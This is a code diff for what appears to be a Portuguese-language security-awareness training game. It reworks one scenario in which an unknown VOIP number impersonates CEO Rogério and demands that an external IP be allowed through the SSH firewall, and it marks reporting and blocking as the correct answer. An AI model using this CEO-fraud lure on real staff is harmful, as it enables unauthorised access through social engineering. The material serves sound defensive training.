         channel: 'zap',
         time: '17:30',
-        senderName: 'Diretoria Presidência (Via TechZap)',
+        senderName: 'Número Desconhecido',
         senderEmail: '+1 (555) 019-2831',
-        avatarChar: 'D',
+        avatarChar: '?',
         avatarColor: '#424242',
-        subject: '[CHAT TECHZAP] "Urgente: Libere o acesso SSH para a nova consultoria"',
+        subject: 'Número desconhecido: "Sou o Rogério CEO — libere acesso SSH urgente"',
         snippet: 'Aqui é o Rogério de outro celular em viagem internacional. Libere o IP 198.51.100.22...',
-        meta: { 'Número': '+1 555 019-2831 (EUA / VOIP)', 'Data': '17:28', 'Status': 'Número VOIP Desconhecido' },
-        body: `
-          <div class="techzap-chat-card">
-            <div class="chat-bubble-incoming">
-              <strong>Desconhecido (Foto do Rogério):</strong><br>
-              "Aqui é o Rogério CEO. Estou em Nova York fechando um contrato de aquisição. Preciso que você libere agora o IP 198.51.100.22 no firewall SSH. Não fale com ninguém sobre isso."
-            </div>
-          </div>
-        `,
-        inspector: { type: 'url', label: 'Auditoria de Número de Telefone', dest: 'Telefone: +1 (555) 019-2831 (VOIP Não Registrado) | Ação: Liberação de Porta 22 SSH' },
+        meta: { 'Número': '+1 555 019-2831 (EUA / VOIP)', 'Data': '17:28', 'Status': 'Número VOIP Desconhecido — NÃO registrado na TechCore' },
+        body: `<div class="techzap-screen">
+  <div class="wz-topbar">
+    <span class="wz-topbar-back">←</span>
+    <div class="wz-topbar-avatar" style="background:#424242;">?</div>
+    <div class="wz-topbar-info">
+      <div class="wz-topbar-name">+1 (555) 019-2831</div>
+      <div class="wz-topbar-status">Número não salvo · online</div>
+    </div>
+    <div class="wz-topbar-icons"><span>📞</span><span>⋮</span></div>
+  </div>
+  <div class="wz-chat-bg">
+    <div class="wz-date-label">HOJE</div>
+    <div class="wz-msg-row incoming">
+      <div class="wz-msg-avatar" style="background:#424242;">?</div>
+      <div class="wz-bubble">
+        <div class="wz-bubble-sender" style="color:#e53935;">⚠️ Número Desconhecido</div>
+        Aqui é o Rogério CEO. Estou em Nova York fechando um contrato de aquisição. Preciso que você libere <strong>agora</strong> o IP 198.51.100.22 no firewall SSH. <strong>Não fale com ninguém sobre isso.</strong>
+        <div class="wz-bubble-footer"><span class="wz-bubble-time">17:28</span></div>
+      </div>
+    </div>
+  </div>
+  <div class="wz-input-bar">
+    <span>😊</span>
+    <input class="wz-input-field" value="Digite uma mensagem..." readonly>
+    <button class="wz-send-btn">➤</button>
+  </div>
+</div>`,
+        inspector: { type: 'url', label: 'Auditoria de Número de Telefone', dest: 'Telefone: +1 (555) 019-2831 — VOIP não registrado nos sistemas TechCore | Ação solicitada: Liberação de Porta 22 (SSH) para IP externo' },
         actions: [
-          { id: 'a1', label: '🚨 Denunciar Número & Bloquear no Gateway', correct: true, toastMsg: 'Número falso bloqueado.', logTitle: 'Fraude do CEO no WhatsApp Neutralizada', consequence: 'Tentativa de manipulação executiva abortada e registrada no relatório.', explanation: 'Excelente! O CEO Rogério usa exclusivamente os canais oficiais internos.' },
-          { id: 'a2', label: '🔓 Abrir Porta SSH no Firewall', correct: false, toastMsg: 'Porta liberada.', logTitle: 'Porta SSH Exposta a Invasores', consequence: 'Os criminosos invadiram o gateway central através da porta liberada.', explanation: 'Fraude do CEO por número VOIP desconhecido violando as políticas.' }
+          { id: 'a1', label: '🚨 Denunciar Número & Bloquear no Gateway', correct: true, toastMsg: 'Número falso bloqueado.', logTitle: 'Fraude do CEO no WhatsApp Neutralizada', consequence: 'Tentativa de manipulação executiva abortada e registrada no relatório de incidentes.', explanation: 'Perfeito! Número VOIP desconhecido, não registrado na TechCore. O CEO Rogério usa exclusivamente os canais oficiais internos.' },
+          { id: 'a2', label: '🔓 Abrir Porta SSH no Firewall', correct: false, toastMsg: 'Porta liberada.', logTitle: 'Porta SSH Exposta a Invasores', consequence: 'Os criminosos invadiram o gateway central através da porta liberada por número falso.', explanation: 'Fraude clássica de CEO (CEO Fraud). Número VOIP + pedido de sigilo + urgência = ataque de engenharia social.' }
         ]
       }
     ]
